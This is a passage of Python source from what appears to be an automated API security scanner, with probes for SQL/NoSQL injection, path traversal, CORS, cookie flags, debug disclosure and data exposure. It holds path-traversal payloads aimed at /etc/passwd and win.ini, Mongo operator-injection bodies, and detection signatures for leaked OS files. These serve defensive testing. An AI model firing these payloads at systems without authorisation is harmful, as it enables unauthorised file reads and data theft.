             and field_names(x.get("request_fields"))][:6]
    g_eps = [x for x in eps if str(x.get("method", "")).upper() == "GET"][:8]
    if not w_eps and not g_eps:
        _no_candidates(sess, "malformed-input", "endpoint to send a malformed value to")
        return out
    reached = exercised = 0

    for e in w_eps:
        method = str(e.get("method", "POST")).upper()
        path = re.sub(r"\{[^}]+\}", "1", str(e.get("path", "")))
        headers = headers_for(e)
        fields = field_names(e.get("request_fields"))
        benign = _benign_body(fields)
        try:
            rb = sess.request(method, f"{base}{path}", json=benign, headers=headers, timeout=15)
        except Exception:
            continue
        reached += 1
        if rb.status_code >= 500 or rb.status_code >= 400:
            continue  # baseline must be accepted, else we can't attribute a later 5xx
        exercised += 1
        for fld in fields[:6]:
            bad = dict(benign, **{fld: "qax-not-a-valid-value-!@#"})
            try:
                r = sess.request(method, f"{base}{path}", json=bad, headers=headers, timeout=15)
            except Exception:
                continue
            if r.status_code < 500:
                continue
            body = (r.text or "").lower()
            if any(s in body for s in _DEBUG_INTERACTIVE):
                sev, kind = "P1", "Debug mode / interactive debugger exposed"
            elif any(s in body for s in _DEBUG_TRACE):
                sev, kind = "P2", "Stack trace disclosed"
            else:
                sev, kind = "P2", "Unhandled server error (input not validated)"
            out.append(ProbeFinding(
                probe="malformed-input",
                title=f"{kind} on {method} {e.get('path')} (field '{fld}')",
                exploited=True, severity=sev,
                evidence=(f"A valid body returned {rb.status_code}, but setting '{fld}' to a "
                          f"type-violating value returned HTTP {r.status_code}"
                          + (" exposing an interactive debugger" if sev == "P1" else
                             " with a stack trace/internals" if kind.startswith("Stack") else
                             " — the value is parsed without validation")
                          + ". Malformed input must be rejected with a 4xx."),
                target=str(e.get("path", ""))))
            break  # one finding per endpoint is enough

    # Query-param pass: a type-violating value on a GET param the server parses
    # unguarded (int(request.args.get('page'))...). Tries grounded query params plus
    # common numeric ones, so it works even when no spec lists them.
    for e in g_eps:
        path = re.sub(r"\{[^}]+\}", "1", str(e.get("path", "")))
        headers = headers_for(e)
        qps = list(e.get("query_params") or [])
        cands = qps + [p for p in _COMMON_NUMERIC_PARAMS if p not in qps]
        base_params = {p: ("1" if _numeric_param(p) else "qaxprobe1") for p in cands}
        try:
            rb = sess.get(f"{base}{path}", params=base_params, headers=headers, timeout=15)
        except Exception:
            continue
        reached += 1
        if rb.status_code >= 500:
            continue
        exercised += 1
        for p in cands[:7]:
            try:
                r = sess.get(f"{base}{path}", params=dict(base_params, **{p: "qax-not-a-number-!@#"}),
                             headers=headers, timeout=15)
            except Exception:
                continue
            if r.status_code < 500:
                continue
            body = (r.text or "").lower()
            if any(s in body for s in _DEBUG_INTERACTIVE):
                sev, kind = "P1", "Debug mode / interactive debugger exposed"
            elif any(s in body for s in _DEBUG_TRACE):
                sev, kind = "P2", "Stack trace disclosed"
            else:
                sev, kind = "P2", "Unhandled server error (input not validated)"
            out.append(ProbeFinding(
                probe="malformed-input",
                title=f"{kind} on GET {e.get('path')} (query param '{p}')",
                exploited=True, severity=sev,
                evidence=(f"A valid request returned {rb.status_code}, but '{p}' set to a "
                          f"type-violating value returned HTTP {r.status_code}"
                          + (" exposing an interactive debugger" if sev == "P1" else
                             " with a stack trace/internals" if kind.startswith("Stack") else
                             " — the value is parsed without validation")
                          + ". Malformed query input must be rejected with a 4xx."),
                target=str(e.get("path", ""))))
            break
    if not out:
        if not reached:
            _unreached(sess, "malformed-input", len(w_eps) + len(g_eps))
        elif not exercised:
            _skip(sess, "malformed-input", "could not exercise it: the valid baseline request was rejected "
                                           "(4xx) or crashed (5xx) on every candidate endpoint, so a "
                                           "malformed value had nothing valid to be compared with",
                  needs="valid-body")
    return out
def injection_probe(model, base_url: str, *, session: requests.Session | None = None,
                    auth: dict | None = None, limit: int = 6) -> list[ProbeFinding]:
    """
    SQL injection via QUERY parameters and request-BODY fields (the path-param case
    is sqli_probe). Uses the same error-based + boolean-differential control. Query
    fuzzing is GET-only (idempotent); body fuzzing is POST/PUT/PATCH only (never
    DELETE — a body on DELETE could destroy data). Deterministic, no model calls.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, field_names
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    eps = [e for e in getattr(model, "endpoints", []) if isinstance(e, dict)]
    _tok = {"v": None}
    reached = [0]

    def token_for(e):
        if not e.get("auth_required"):
            return {}
        if _tok["v"] is None:
            _tok["v"] = _resolve_token(sess, base, recipe, model,
                                       f"inj_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
            _need_token(sess, "injection", _tok["v"])
        return _auth_headers(_tok["v"], auth)

    q_eps = [x for x in eps if str(x.get("method", "")).upper() == "GET" and x.get("query_params")][:limit]
    b_eps = [x for x in eps if str(x.get("method", "")).upper() in ("POST", "PUT", "PATCH")
             and field_names(x.get("request_fields"))][:limit]
    if not q_eps and not b_eps:
        _no_candidates(sess, "injection", "endpoint with query parameters or a writable body")
        return out

    # Query-param injection — GET only (safe to repeat).
    for e in q_eps:
        path = re.sub(r"\{[^}]+\}", "qaxprobe1", str(e.get("path", "")))
        headers = token_for(e)
        qps = list(e.get("query_params") or [])
        for qp in qps[:3]:
            def send(value, _qp=qp, _h=headers, _p=path):
                params = {p: "qaxprobe1" for p in qps}
                params[_qp] = value
                try:
                    r = sess.get(f"{base}{_p}", params=params, headers=_h, timeout=15)
                    reached[0] += 1
                    return r.status_code, r.text
                except Exception:
                    return None, ""

            f = _detect_injection(send, method="GET", path=str(e.get("path", "")),
                                  where=f"query param '{qp}'")
            if f:
                out.append(f)

    # Body-field injection — POST/PUT/PATCH only (never DELETE).
    for e in b_eps:
        method = str(e.get("method", "POST")).upper()
        path = re.sub(r"\{[^}]+\}", "qaxprobe1", str(e.get("path", "")))
        headers = token_for(e)
        fields = field_names(e.get("request_fields"))
        benign = _benign_body(fields)
        for fld in [f for f in fields if _stringy(f, benign.get(f))][:3]:
            def send(value, _fld=fld, _h=headers, _p=path, _m=method):
                body = dict(benign, **{_fld: value})
                try:
                    r = sess.request(_m, f"{base}{_p}", json=body, headers=_h, timeout=15)
                    reached[0] += 1
                    return r.status_code, r.text
                except Exception:
                    return None, ""

            f = _detect_injection(send, method=method, path=str(e.get("path", "")),
                                  where=f"body field '{fld}'")
            if f:
                out.append(f)
    if not out and not reached[0]:
        _unreached(sess, "injection", len(q_eps) + len(b_eps))
    return out


_NOSQL_ERRORS = ("pymongo", "montydb", "bson", "mongoerror", "mongoclient",
                 "unknown operator", "invaliddocument", "cannot encode", "$where")


def nosql_probe(model, base_url: str, *, session: requests.Session | None = None,
                auth: dict | None = None) -> list[ProbeFinding]:
    """
    NoSQL (operator) injection on write endpoints whose body feeds a document query.
    Control: a plain string value vs a Mongo OPERATOR OBJECT in the same field.
      • confirmed (P1): a TRUE operator ({"$ne": <nomatch>}) returns 200 with far
        more data than the benign value and a matched FALSE operator ({"$eq":
        <nomatch>}) — the filter was bypassed; OR the response carries a NoSQL
        error signature.
      • lead (P3): the operator object only triggers a generic 5xx (reaches the
        query engine but we can't prove a bypass — not confirmed, don't cry wolf).
    Candidate field names come from the body schema and from query params of the
    same path (apps like vfapi read a raw JSON body keyed like their GET filter).
    POST/PUT/PATCH only (never DELETE). Deterministic, no model calls.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, field_names
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    eps = [e for e in getattr(model, "endpoints", []) if isinstance(e, dict)]

    # path -> query-param names seen on ANY method (a raw-body POST often keys by them)
    path_qps: dict = {}
    for e in eps:
        p = str(e.get("path", ""))
        path_qps.setdefault(p, [])
        for qp in (e.get("query_params") or []):
            if qp not in path_qps[p]:
                path_qps[p].append(qp)

    _tok = {"v": None}

    def token_for(e):
        if not e.get("auth_required"):
            return {}
        if _tok["v"] is None:
            _tok["v"] = _resolve_token(sess, base, recipe, model,
                                       f"nosql_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
            _need_token(sess, "nosql", _tok["v"])
        return _auth_headers(_tok["v"], auth)

    writes = [x for x in eps if str(x.get("method", "")).upper() in ("POST", "PUT", "PATCH")][:6]
    if not writes:
        _no_candidates(sess, "nosql", "write (POST/PUT/PATCH) endpoint")
        return out
    candidates = exercised = 0

    for e in writes:
        method = str(e.get("method", "POST")).upper()
        path = re.sub(r"\{[^}]+\}", "qaxprobe1", str(e.get("path", "")))
        headers = token_for(e)
        fields = field_names(e.get("request_fields"))
        keys = list(fields) + [k for k in path_qps.get(str(e.get("path", "")), []) if k not in fields]
        if not keys:
            continue
        candidates += 1
        others = _benign_body(fields)
        for key in keys[:3]:
            def send(value, _k=key, _h=headers, _p=path, _m=method):
                body = dict(others, **{_k: value})
                try:
                    r = sess.request(_m, f"{base}{_p}", json=body, headers=_h, timeout=15)
                    return r.status_code, r.text
                except Exception:
                    return None, ""

            def ask(value):
                s, b = send(value)
                if s is None:
                    s, b = send(value)
                return s, b

            sb, bb = ask("qaxprobe1")
            if sb is None or sb >= 500:
                continue                    # the benign baseline failed → no valid comparison
            exercised += 1
            nben = len(bb or "")
            st, bt = ask({"$ne": "qax_nomatch_zzz"})
            sf, bf = ask({"$eq": "qax_nomatch_zzz"})
            where = f"body field '{key}'"
            if st == 200 and sf == 200 and bt is not None and bf is not None \
                    and len(bt) > max(len(bf), nben) * 2 + 20:
                out.append(ProbeFinding(
                    probe="nosql", title=f"NoSQL injection in {method} {str(e.get('path',''))} ({where})",
                    exploited=True, severity="P1",
                    evidence=(f"A query operator in {where} bypassed the filter: a TRUE operator "
                              f"returned far more data ({len(bt)}B) than a matched FALSE one ({len(bf)}B) "
                              f"or the benign value ({nben}B)."),
                    target=str(e.get("path", ""))))
            elif st is not None and st >= 500:
                if any(s in (bt or "").lower() for s in _NOSQL_ERRORS):
                    out.append(ProbeFinding(
                        probe="nosql", title=f"NoSQL injection in {method} {str(e.get('path',''))} ({where})",
                        exploited=True, severity="P1",
                        evidence=(f"A query operator in {where} produced a NoSQL/driver error (benign → "
                                  f"{sb}, operator → {st}); the raw body reaches the document query."),
                        target=str(e.get("path", ""))))
                else:
                    out.append(ProbeFinding(
                        probe="nosql-lead",
                        title=f"Operator object rejected with 500 in {method} {str(e.get('path',''))} ({where})",
                        exploited=True, severity="P3",
                        evidence=(f"A Mongo operator object in {where} caused HTTP {st} while a plain "
                                  f"string was accepted ({sb}) — the body may feed a document query "
                                  f"(possible NoSQL injection), NOT confirmed. Reported low and separately."),
                        target=str(e.get("path", ""))))
    if not out and candidates and not exercised:
        _skip(sess, "nosql", f"could not exercise it: the benign baseline request failed or crashed on "
                             f"all {candidates} candidate endpoint(s), so the operator variants had "
                             f"nothing valid to be compared with", needs="valid-body")
    return out


# Field names that must NEVER appear in a response body — a credential or secret
# in output is an exposure regardless of auth. Token-family names are deliberately
# excluded: a login returning an access_token is the expected, correct behaviour.
_SENSITIVE_OUT = ("password", "passwd", "pwd", "secret", "private_key", "privatekey",
                  "ssn", "social_security", "credit_card", "creditcard", "card_number",
                  "cardnumber", "cvv", "cvc", "salt", "password_hash", "pwd_hash")


def _sensitive_keys(data, found: set | None = None) -> set:
    """Recursively collect response keys that name a credential/secret with a value."""
    found = found if found is not None else set()
    if isinstance(data, dict):
        for k, v in data.items():
            kl = str(k).lower()
            if any(s in kl for s in _SENSITIVE_OUT) and v not in (None, "", [], {}):
                found.add(str(k))
            _sensitive_keys(v, found)
    elif isinstance(data, list):
        for item in data:
            _sensitive_keys(item, found)
    return found


def excessive_data_probe(model, base_url: str, *, session: requests.Session | None = None,
                         auth: dict | None = None) -> list[ProbeFinding]:
    """
    Excessive Data Exposure: fetch each GET endpoint and inspect the LIVE response
    body (not the spec — nested secrets don't show as top-level fields) for keys
    that should never be returned. A credential in output, especially on an
    unauthenticated endpoint, is the finding. Deterministic, no model calls.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    gets = [e for e in getattr(model, "endpoints", [])
            if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"]
    if not gets:
        _no_candidates(sess, "excessive-data", "GET endpoint")
        return out
    token = None
    seen: set = set()
    reached = 0
    skipped_auth = 0
    for e in gets[:20]:
        path = str(e.get("path", ""))
        resolved = re.sub(r"\{[^}]+\}", "qaxprobe1", path)
        if resolved in seen:
            continue
        seen.add(resolved)
        headers = {}
        if e.get("auth_required"):
            if token is None:
                token = _resolve_token(sess, base, recipe, model,
                                       f"ede_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
            if not token:
                skipped_auth += 1          # this endpoint needs auth and we have no token: not checked
                continue
            headers = _auth_headers(token, auth)
        try:
            r = sess.get(f"{base}{resolved}", headers=headers, timeout=15)
        except Exception:
            continue
        reached += 1
        try:
            if r.status_code >= 400:
                continue
            data = r.json()
        except Exception:
            continue
        hits = _sensitive_keys(data)
        if hits:
            public = not e.get("auth_required")
            out.append(ProbeFinding(
                probe="excessive-data",
                title=f"Excessive data exposure in GET {path}",
                exploited=True, severity="P1" if public else "P2",
                evidence=(f"The response exposes sensitive field(s) {sorted(hits)} "
                          + ("with NO authentication required" if public
                             else "to any authenticated user")
                          + f" (HTTP {r.status_code}). Credentials/secrets must never be returned."),
                target=path))
    if skipped_auth:
        _skip(sess, "excessive-data", f"{skipped_auth} endpoint(s) need auth, but no token was supplied and "
                                      f"self-registration/login failed — they were not checked", needs="auth-token")
    if not out and not reached and not skipped_auth:
        _unreached(sess, "excessive-data", len(gets[:20]))
    return out
def cookie_flags_probe(model, base_url: str, *, session: requests.Session | None = None) -> list[ProbeFinding]:
    """
    Cookie hardening (QA knowledge base sec 1.3): a cookie set at login should carry
    HttpOnly (and Secure over HTTPS). Reads the raw Set-Cookie header(s) from the
    register/login responses. Bearer-token APIs (no cookies) no-op cleanly, so this
    only speaks when there is a real cookie to judge — low false positives. No model calls.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, register_body
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    is_https = base.lower().startswith("https")

    ident = f"cookie_{uuid.uuid4().hex[:8]}@example.com"
    set_cookies: list[str] = []
    reached = 0
    for path, body in ((recipe["register_path"], register_body(recipe, model, ident)),
                       (recipe["login_path"], None)):
        try:
            if body is not None:
                r = sess.post(f"{base}{path}", json=body, timeout=15)
            else:
                # Reuse the login identifier the register body used.
                lb = {recipe["id_field"]: ident, recipe["secret_field"]: "Secret123!"}
                r = sess.post(f"{base}{path}", json=lb, timeout=15)
        except Exception:
            continue
        reached += 1
        # requests joins multiple Set-Cookie values; split defensively on ", <name>=".
        raw = r.headers.get("Set-Cookie") or ""
        if raw:
            set_cookies.append(raw)

    seen: set = set()
    for raw in set_cookies:
        for piece in re.split(r",(?=[^;=]+=)", raw):
            attrs = piece.strip().lower()
            name = piece.strip().split("=", 1)[0].strip()
            if not name or name in seen:
                continue
            seen.add(name)
            missing = []
            if "httponly" not in attrs:
                missing.append("HttpOnly")
            if is_https and "secure" not in attrs:
                missing.append("Secure")
            if missing:
                sev = "P2" if "HttpOnly" in missing else "P3"
                out.append(ProbeFinding(
                    probe="cookie-flags",
                    title=f"Cookie '{name}' is missing {', '.join(missing)}",
                    exploited=True, severity=sev,
                    evidence=(f"Login set cookie '{name}' without {', '.join(missing)}. "
                              + ("Without HttpOnly it is readable by JavaScript (XSS → session theft). "
                                 if "HttpOnly" in missing else "")
                              + ("Without Secure it can leak over plain HTTP. " if "Secure" in missing else "")),
                    target=recipe["login_path"]))
    if not out:
        if not reached:
            _unreached(sess, "cookie-flags", 2)
        elif not set_cookies:
            _skip(sess, "cookie-flags", "no cookie was set on registration or login, so there were no cookie "
                                        "flags to check (bearer-token APIs don't use cookies)",
                  kind="not-applicable")
    return out
# Interactive debuggers (exposed = source disclosure AND often remote code execution).
_DEBUG_INTERACTIVE = ("werkzeug debugger", "__debugger__", "flask debugtoolbar",
                      "console.png?__debugger__", "werkzeug powered traceback interpreter")
# Stack-trace / internal-error disclosure (source paths, framework internals).
_DEBUG_TRACE = ("traceback (most recent call last)", "sqlalchemy.exc", "psycopg2.",
                "application trace", "exception value:", "request method:",
                'at object.<anonymous>', ".py&#34;, line ", '.py", line ', "stack trace:")


def debug_disclosure_probe(model, base_url: str, *, session: requests.Session | None = None,
                           auth: dict | None = None) -> list[ProbeFinding]:
    """
    Debug-mode / stack-trace disclosure (QA knowledge base sec 1.9): a deployed app
    should never return an interactive debugger or a raw stack trace. Provokes an
    error with a malformed path value, then looks for HIGH-CONFIDENCE signatures
    only (a regex hit is a lead, not a finding — so weak matches are excluded).
    An exposed interactive debugger is P1 (often RCE); a bare stack trace is P2.
    """
    sess = session or requests.Session()
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    lookups = [e for e in getattr(model, "endpoints", [])
               if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"
               and "{" in str(e.get("path", ""))]
    if not lookups:
        _no_candidates(sess, "debug-disclosure", "GET endpoint with a path parameter")
        return out
    token = None
    if any(e.get("auth_required") for e in lookups[:4]):
        from core.auth_recipe import derive_auth_recipe
        token = _resolve_token(sess, base, derive_auth_recipe(model), model,
                               f"dbg_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
        _need_token(sess, "debug-disclosure", token)
    seen: set = set()
    reached = 0
    for e in lookups[:4]:
        path = str(e.get("path", ""))
        m = re.search(r"\{([^}]+)\}", path)
        if not m:
            continue
        resolved = path.replace("{" + m.group(1) + "}", "qax%27%22bad")
        if resolved in seen:
            continue
        seen.add(resolved)
        hdr = _auth_headers(token, auth) if e.get("auth_required") else {}
        try:
            r = sess.get(f"{base}{resolved}", headers=hdr, timeout=15)
        except Exception:
            continue
        reached += 1
        body = (r.text or "").lower()
        if any(s in body for s in _DEBUG_INTERACTIVE):
            out.append(ProbeFinding(
                probe="debug-disclosure",
                title=f"Interactive debugger exposed on {e.get('method')} {path}",
                exploited=True, severity="P1",
                evidence=(f"An error on {path} returned an interactive debugger page (HTTP "
                          f"{r.status_code}). This leaks source and stack frames and its console "
                          f"can lead to remote code execution — debug mode must be off in a "
                          f"deployed app."),
                target=path))
        elif any(s in body for s in _DEBUG_TRACE):
            out.append(ProbeFinding(
                probe="debug-disclosure",
                title=f"Stack trace / internal error disclosed on {e.get('method')} {path}",
                exploited=True, severity="P2",
                evidence=(f"An error on {path} returned a raw stack trace / framework internals "
                          f"(HTTP {r.status_code}), disclosing source paths and implementation "
                          f"detail that aid an attacker. Errors should be generic."),
                target=path))
    if not out and not reached:
        _unreached(sess, "debug-disclosure", len(seen))
    return out
def error_handling_probe(model, base_url: str, *, session: requests.Session | None = None) -> list[ProbeFinding]:
    """
    Robustness: an unknown route must return 404, not a 5xx (QA knowledge base sec
    1.8). A 500 on a path that CANNOT exist pollutes monitoring/alerting and makes
    real faults indistinguishable from scanner noise. Uses a guaranteed-nonexistent
    control path, so any 5xx is unambiguous — near-zero false positives. No model calls.
    """
    sess = session or requests.Session()
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    nonsense = f"/qax_nonexistent_{uuid.uuid4().hex[:12]}/does/not/exist"
    try:
        r = sess.get(f"{base}{nonsense}", timeout=15)
    except Exception:
        _unreached(sess, "error-handling", 1)
        return out
    if r.status_code >= 500:
        out.append(ProbeFinding(
            probe="error-handling",
            title="Unknown routes return a server error (5xx) instead of 404",
            exploited=True, severity="P3",
            evidence=(f"GET {nonsense} — a path that cannot exist — returned HTTP {r.status_code}. "
                      f"Unknown routes should return 404; a 5xx pollutes monitoring and makes real "
                      f"faults and scans indistinguishable from crashes."),
            target="(any unknown route)"))   # stable: the random probe path is in the evidence only
    return out


def crash_fuzz_probe(model, base_url: str, *, session: requests.Session | None = None) -> list[ProbeFinding]:
    """Send oversized inputs to auth endpoints and flag any 5xx (unhandled crash)."""
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, register_body
    recipe = derive_auth_recipe(model)
    register = recipe["register_path"]
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    # 100 chars: over bcrypt's 72-byte limit but within a typical 128 schema max,
    # so validation accepts it and the crash surfaces at the hashing step.
    big_password = "A" * 100
    try:
        r = sess.post(f"{base}{register}",
                      json=register_body(recipe, model, f"fuzz_{uuid.uuid4().hex[:8]}@example.com",
                                         password=big_password),
                      timeout=15)
        if r.status_code in (404, 405):
            _skip(sess, "crash-fuzz", f"no self-registration endpoint answered at {register} "
                                      f"(HTTP {r.status_code}) — nothing to fuzz", kind="not-applicable")
        if r.status_code >= 500:
            out.append(ProbeFinding(
                probe="crash-fuzz", title="Server error (5xx) on oversized password",
                exploited=True, severity="P2",
                evidence=f"POST {register} with a {len(big_password)}-char password → HTTP "
                         f"{r.status_code} (valid per the schema's max length; exceeds the hashing "
                         f"library's 72-byte limit)",
                target=register))
    except Exception as exc:  # pragma: no cover - network
        logger.warning("crash_fuzz failed: %s", exc)
        _unreached(sess, "crash-fuzz", 1)
    return out


def security_headers_probe(model, base_url: str, *, session: requests.Session | None = None) -> list[ProbeFinding]:
    """
    Response-hardening headers (OWASP Secure Headers). One GET of the app root tells
    us whether the standard protections are set. Reports at most two consolidated
    findings — HSTS over HTTPS (P2) and the clickjacking/sniffing set (P3) — so this
    is a clear new angle without crying wolf. Deterministic, no auth, no model calls.
    """
    sess = session or requests.Session()
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    try:
        r = sess.get(base + "/", timeout=15)
    except Exception:
        _unreached(sess, "security-headers", 1)
        return out
    h = {k.lower(): v for k, v in r.headers.items()}
    is_https = base.lower().startswith("https")
    csp = h.get("content-security-policy", "")

    # HSTS only means anything over HTTPS; flagging it on plain HTTP would be noise.
    if is_https and "strict-transport-security" not in h:
        out.append(ProbeFinding(
            probe="security-headers",
            title="Strict-Transport-Security (HSTS) header is not set",
            exploited=True, severity="P2",
            evidence=("The HTTPS app root returned no Strict-Transport-Security header, so a "
                      "browser can be downgraded to plain HTTP on the first/next visit "
                      "(SSL-strip → session theft)."),
            target="/"))

    missing = []
    if "x-content-type-options" not in h:
        missing.append("X-Content-Type-Options")              # MIME-sniffing
    if "x-frame-options" not in h and "frame-ancestors" not in csp.lower():
        missing.append("X-Frame-Options / CSP frame-ancestors")  # clickjacking
    if not csp:
        missing.append("Content-Security-Policy")             # XSS defence-in-depth
    if missing:
        out.append(ProbeFinding(
            probe="security-headers",
            title="Response security headers missing: " + ", ".join(missing),
            exploited=True, severity="P3",
            evidence=("The app root (HTTP %d) did not set: %s. These are defence-in-depth "
                      "against clickjacking, MIME-sniffing and XSS." % (r.status_code, ", ".join(missing))),
            target="/"))
    return out


# An origin an attacker would control — never one the app should trust. If it comes
# back reflected in Access-Control-Allow-Origin, CORS is echoing the caller's Origin.
_EVIL_ORIGIN = "https://qax-cors-probe.example"


def cors_probe(model, base_url: str, *, session: requests.Session | None = None,
               auth: dict | None = None) -> list[ProbeFinding]:
    """
    CORS misconfiguration (OWASP). We send an attacker-controlled Origin; if the app
    reflects that exact origin back in Access-Control-Allow-Origin it trusts ANY site.
    Reflection + Allow-Credentials:true is P2 (a malicious page can read the victim's
    authenticated responses); reflection alone is P3. The proof is that the response
    echoes the origin we sent — self-controlling, near-zero false positives.
    """
    sess = session or requests.Session()
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    # Test the root AND a sample of GET endpoints — CORS is often misconfigured on a
    # specific handler, not the root. One reflecting endpoint proves it, so stop there.
    targets = ["/"]
    for e in getattr(model, "endpoints", []):
        if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET":
            p = re.sub(r"\{[^}]+\}", "1", str(e.get("path", "")))
            if p and p not in targets:
                targets.append(p)
    reached = 0
    for path in targets[:15]:
        try:
            r = sess.get(base + path, headers={"Origin": _EVIL_ORIGIN}, timeout=15)
        except Exception:
            continue
        reached += 1
        acao = (r.headers.get("Access-Control-Allow-Origin") or "").strip()
        acac = (r.headers.get("Access-Control-Allow-Credentials") or "").strip().lower()
        if acao == _EVIL_ORIGIN:
            creds = acac == "true"
            out.append(ProbeFinding(
                probe="cors",
                title="CORS reflects an arbitrary Origin" + (" with credentials" if creds else "")
                      + (f" on {path}" if path != "/" else ""),
                exploited=True, severity="P2" if creds else "P3",
                evidence=("Request to %s with Origin: %s was answered with Access-Control-Allow-Origin: "
                          "%s%s. The app trusts any site's origin, so a malicious page can make "
                          "cross-origin requests%s." % (path, _EVIL_ORIGIN, acao,
                                       " and Access-Control-Allow-Credentials: true" if creds else "",
                                       " and read the victim's authenticated responses" if creds
                                       else " to this API")),
                target=path))
            break   # one proof is enough
    if not out and not reached:
        _unreached(sess, "cors", len(targets[:15]))
    return out


# Signatures that only appear if a file outside the web root was actually read back.
_TRAVERSAL_SIGS = (re.compile(r"root:.*:0:0:"),            # /etc/passwd
                   re.compile(r"\[extensions\]", re.I),    # Windows win.ini
                   re.compile(r"for 16-bit app support", re.I))
# For a {path} segment: classic traversal (incl. a pre-encoded variant).
_TRAVERSAL_PAYLOADS = ("../../../../../../etc/passwd",
                       "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
                       "....//....//....//....//etc/passwd",
                       "../../../../../../windows/win.ini")
# For a query param: raw payloads (requests encodes them), plus ABSOLUTE paths — many
# file-read handlers accept an absolute path with no traversal needed.
_TRAVERSAL_QUERY_PAYLOADS = ("/etc/passwd", "../../../../../../etc/passwd",
                             "....//....//....//....//etc/passwd",
                             "C:\\windows\\win.ini", "../../../../../../windows/win.ini")
# Query-parameter names that commonly feed a filesystem path.
_FILE_PARAM_KW = ("file", "filename", "filepath", "path", "dir", "folder", "document",
                  "doc", "template", "download", "attachment", "load", "read", "view",
                  "page", "log", "resource", "include")


def path_traversal_probe(model, base_url: str, *, session: requests.Session | None = None,
                         auth: dict | None = None, limit: int = 5) -> list[ProbeFinding]:
    """
    Path traversal / local file inclusion (OWASP). For GET endpoints that build a file
    path from a PATH parameter or a file-ish QUERY parameter (filename, path, ...), we
    send traversal and absolute-path payloads and confirm ONLY when the response body
    contains an unmistakable OS-file signature (e.g. /etc/passwd's `root:...:0:0:`).
    A benign value never contains it, so this is a proven P1 read of a file outside the
    web root — not a guess. No model calls.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    gets = [e for e in getattr(model, "endpoints", [])
            if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"]
    path_cands = [e for e in gets if "{" in str(e.get("path", ""))]
    query_cands = [(e, qp) for e in gets for qp in (e.get("query_params") or [])
                   if any(k in str(qp).lower() for k in _FILE_PARAM_KW)]
    if not path_cands and not query_cands:
        _no_candidates(sess, "path-traversal", "GET endpoint with a path parameter or a file-like query parameter")
        return out
    token = None
    if any(e.get("auth_required") for e in path_cands) or any(e.get("auth_required") for e, _ in query_cands):
        token = _resolve_token(sess, base, recipe, model, f"trav_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
        _need_token(sess, "path-traversal", token)
    reached = 0

    def _signature_hit(r):
        return any(sig.search(r.text or "") for sig in _TRAVERSAL_SIGS)

    # Path parameters: substitute the payload into the {segment}.
    for e in path_cands[:limit]:
        path = str(e.get("path", ""))
        m = re.search(r"\{([^}]+)\}", path)
        if not m:
            continue
        param = m.group(1)
        headers = _auth_headers(token, auth) if e.get("auth_required") else {}
        for payload in _TRAVERSAL_PAYLOADS:
            try:
                r = sess.get(f"{base}{path.replace('{' + param + '}', payload)}", headers=headers, timeout=15)
            except Exception:
                continue
            reached += 1
            if _signature_hit(r):
                out.append(ProbeFinding(
                    probe="path-traversal",
                    title=f"Path traversal / local file read via path param '{param}' on {path}",
                    exploited=True, severity="P1",
                    evidence=(f"GET {path} with '{param}'='{payload}' returned an OS file's contents "
                              f"(HTTP {r.status_code}; matched /etc/passwd or win.ini). The parameter "
                              f"builds a filesystem path without sanitisation."),
                    target=path))
                break

    # File-ish query parameters: send the payload as that query value.
    seen: set = set()
    for e, qp in query_cands[:limit]:
        path = re.sub(r"\{[^}]+\}", "1", str(e.get("path", "")))
        if (path, qp) in seen:
            continue
        seen.add((path, qp))
        headers = _auth_headers(token, auth) if e.get("auth_required") else {}
        for payload in _TRAVERSAL_QUERY_PAYLOADS:
            try:
                r = sess.get(f"{base}{path}", params={qp: payload}, headers=headers, timeout=15)
            except Exception:
                continue
            reached += 1
            if _signature_hit(r):
                out.append(ProbeFinding(
                    probe="path-traversal",
                    title=f"Path traversal / local file read via query param '{qp}' on {path}",
                    exploited=True, severity="P1",
                    evidence=(f"GET {path}?{qp}={payload} returned an OS file's contents "
                              f"(HTTP {r.status_code}; matched /etc/passwd or win.ini). The parameter "
                              f"builds a filesystem path without sanitisation."),
                    target=path))
                break
    if not out and not reached:
        _unreached(sess, "path-traversal", len(path_cands[:limit]) + len(query_cands[:limit]))
    return out
# ──────────────────────────────────────────────────────────────────────────────
# QA-craft probes mined from the field manual (KB file 03 §3). These encode the
# bug classes a human QA lead caught by hand that pure HTTP/injection probes miss.
# ──────────────────────────────────────────────────────────────────────────────

# Create-body field names that the SERVER owns — never expect these to round-trip
# as we sent them, so a mismatch on one is not a data-loss bug.
_SERVER_OWNED = ("id", "uuid", "guid", "created", "updated", "modified", "_at",
                 "timestamp", "slug", "owner", "author", "user_id", "created_by",
                 "href", "url", "self", "etag", "version", "rev")


def _persistable_fields(fields: list[str]) -> list[str]:
    """String content fields whose value a create should store verbatim (round-trip)."""
    out = []
    for f in fields:
        lf = f.lower()
        if any(k in lf for k in _SECRET_KW):      # never echoed back — not data loss
            continue
